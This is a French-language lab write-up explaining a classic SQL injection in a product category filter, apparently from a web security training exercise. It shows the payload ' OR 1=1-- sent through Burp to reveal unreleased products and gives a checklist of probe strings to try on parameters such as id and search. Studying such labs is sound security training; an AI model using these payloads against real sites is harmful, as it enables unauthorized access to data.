
## 🎯 Objectif

Exploiter une **SQL Injection** pour afficher des produits **non commercialisés**.

---

# 🔍 Surface d’attaque

Page : **filtre de catégorie produit**

URL :

/products?category=Gifts

Requête interceptée dans Burp :

GET /products?category=Gifts HTTP/1.1

---

# 🗄 Requête SQL côté serveur

L’application construit une requête similaire à :

SELECT * FROM products   
WHERE category = 'Gifts'   
AND released = 1

### Signification

- `SELECT *` → récupérer toutes les colonnes
    
- `FROM products` → table produits
    
- `WHERE` → appliquer un filtre
    

Conditions :

category = 'Gifts'  
AND released = 1

Donc seuls les produits :

- dans la catégorie **Gifts**
    
- **déjà publiés**
    

sont affichés.

---

# 💡 Hypothèse de vulnérabilité

Le paramètre :

category

est inséré **directement dans la requête SQL** sans validation.

Donc il est possible d’injecter du SQL.

---

# 🛠 Exploitation

Dans Burp, modifier la requête :

category=Gifts'+OR+1=1--

---

# ⚙️ Requête SQL obtenue

La requête devient :

SELECT * FROM products   
WHERE category = 'Gifts' OR 1=1--'   
AND released = 1

Le symbole :

--

est un **commentaire SQL**.

Tout ce qui suit est ignoré.

La requête réellement exécutée devient :

SELECT * FROM products   
WHERE category = 'Gifts' OR 1=1

---

# ⚡ Pourquoi l’attaque fonctionne

La condition :

1=1

est **toujours vraie**.

Donc la logique devient :

category = 'Gifts' OR TRUE

En logique :

TRUE OR n'importe quoi = TRUE

La base de données renvoie donc **toutes les lignes de la table**.

➡️ Les produits non commercialisés apparaissent.

---

# 🐞 Vulnérabilité

Nom :

SQL Injection

Type :

SQL Injection dans la clause WHERE

Cause :

L’entrée utilisateur est **concaténée directement dans la requête SQL**.

---

# 🧠 Pattern à retenir

Quand tu vois dans une requête :

id=  
category=  
search=  
filter=

Tester :

'  
'--  
' OR 1=1--

---

# 🧩 Structure classique d’une SQL injection

1️⃣ fermer la chaîne SQL

'

2️⃣ ajouter une condition logique

OR 1=1

3️⃣ commenter la fin de la requête

--

Payload final :

' OR 1=1--

---

# 📌 Concepts appris

- structure d’une requête SQL
    
- logique `WHERE / AND / OR`
    
- commentaires SQL `--`
    
- manipulation d’une requête via un paramètre HTTP
    
- interception et modification avec Burp
    

---

# ⭐ Point clé du lab

Une entrée utilisateur non filtrée permet de modifier la logique de la requête SQL.
